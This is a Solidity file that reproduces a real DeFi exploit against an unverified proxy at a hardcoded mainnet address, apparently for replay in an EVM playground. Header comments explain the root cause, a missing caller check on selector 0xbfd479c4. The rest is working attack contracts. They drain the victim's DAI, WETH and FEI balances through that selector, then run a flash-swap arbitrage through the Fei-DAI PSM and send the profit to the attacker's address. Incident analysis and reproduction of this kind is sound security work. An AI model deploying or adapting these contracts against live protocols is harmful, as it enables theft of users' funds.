// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone (non-Foundry) copy of the real exploit's attack contracts, taken
// verbatim from evm-hack-registry/2025-08-unverified_6f7a_exp/test/unverified_6f7a_exp.sol.
// The registry test wraps everything in `ContractTest is BaseTestWithBalanceLog`
// (forge-std `Test`), whose cheatcode-only setup (vm.createSelectFork/vm.deal/
// vm.startPrank) does not exist in the playground's client-side EVM. The real
// entrypoint of the attack, `AttackOrchestrator.execute()`, is itself a plain
// external payable function with NO cheatcode dependency — it is called here
// directly as the synthetic exploit's attackFunction, dropping only the Test
// harness wrapper.
//
// Attack summary: for each token the victim proxy held (DAI, WETH, FEI), the
// attacker bought a 100-wei "admission ticket" of that token, then called the
// unverified proxy's selector 0xbfd479c4 with the VICTIM's full balance as the
// `amount` argument. The proxy delegatecalled into its unverified implementation,
// which forwarded the call to an unverified liquidity router that pulled the
// victim's ENTIRE balance (not the attacker's) into a Uniswap V2 pair and swapped
// it, with no check that the caller owned the funds being moved. After doing this
// for all three tokens, the FEI/WETH and DAI/WETH pairs were left mispriced; a
// final flash-swap arbitrage (borrow FEI, redeem 1:1 for DAI via the Fei-DAI PSM,
// swap DAI for WETH, repay the FEI loan) captured the imbalance as ~0.2498 WETH
// of clean profit.
// Root cause: the proxy's selector 0xbfd479c4 (a rebalance/add-liquidity entry
// point) had no caller authorization and no binding between the `amount`
// parameter and funds actually owned/deposited by msg.sender, so an arbitrary
// caller could force the victim's live token balances through the liquidity path.

address constant ATTACKER = 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783;
address constant VULNERABLE_CONTRACT = 0x6F7a14Bd931554683ed15dC92e25D046Ed68EA68;
address constant UNVERIFIED_ROUTER = 0x14E6D67F824C3a7b4329d3228807f8654294e4bd;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant FEI_DAI_PSM = 0x7842186CDd11270C4Af8C0A99A5E0589c7F249ce;
address constant DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
address constant FEI_WETH_PAIR = 0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

interface IERC20 {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2Router {
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ISimpleFeiDaiPSM {
    function redeem(address to, uint256 amountFeiIn, uint256 minAmountOut) external returns (uint256 amountOut);
}

contract AttackOrchestrator {
    receive() external payable {}

    function execute() external payable {
        VictimBalanceDrainer drainer = new VictimBalanceDrainer();

        uint256 callValue = msg.value / 3;
        drainer.drainToken{value: callValue}(DAI);
        drainer.drainToken{value: callValue}(WETH);
        drainer.drainToken{value: msg.value - callValue * 2}(FEI);

        FeiDaiWethArb arb = new FeiDaiWethArb(ATTACKER);
        arb.execute();

        (bool sent,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(sent, "refund failed");
    }
}

contract VictimBalanceDrainer {
    receive() external payable {}

    function drainToken(
        address token
    ) external payable {
        if (token == WETH) {
            IWETH(WETH).deposit{value: 100}();
        } else {
            address[] memory buyPath = new address[](2);
            buyPath[0] = WETH;
            buyPath[1] = token;
            IUniswapV2Router(UNISWAP_V2_ROUTER)
                .swapETHForExactTokens{value: msg.value}(100, buyPath, address(this), block.timestamp + 1);
        }

        IERC20(token).approve(UNVERIFIED_ROUTER, 100);

        uint256 victimBalance = IERC20(token).balanceOf(VULNERABLE_CONTRACT);
        address[] memory tokens = new address[](1);
        tokens[0] = token;

        (bool success,) = VULNERABLE_CONTRACT.call(
            abi.encodeWithSelector(bytes4(0xbfd479c4), address(this), tokens, uint256(0), victimBalance)
        );
        require(success, "victim call failed");

        (bool refunded,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(refunded, "native refund failed");
    }
}

contract FeiDaiWethArb is IUniswapV2Callee {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        uint256 borrowFei = 1_517_160_312_700_019_137_568;
        IUniswapV2Pair(FEI_WETH_PAIR).swap(borrowFei, 0, address(this), abi.encode(borrowFei));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external override {
        require(msg.sender == FEI_WETH_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        (uint112 feiReserve, uint112 wethReserve,) = IUniswapV2Pair(FEI_WETH_PAIR).getReserves();
        (uint112 daiReserve, uint112 daiPairWethReserve,) = IUniswapV2Pair(DAI_WETH_PAIR).getReserves();

        IERC20(FEI).approve(FEI_DAI_PSM, amount0);
        ISimpleFeiDaiPSM(FEI_DAI_PSM).redeem(DAI_WETH_PAIR, amount0, 0);

        uint256 wethOut = _getAmountOut(amount0, daiReserve, daiPairWethReserve);
        IUniswapV2Pair(DAI_WETH_PAIR).swap(0, wethOut, address(this), "");

        uint256 repayWeth = _getAmountIn(amount0, wethReserve, feiReserve);
        IERC20(WETH).transfer(FEI_WETH_PAIR, repayWeth);

        uint256 profit = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(profitReceiver, profit);
    }

    function _getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }
}
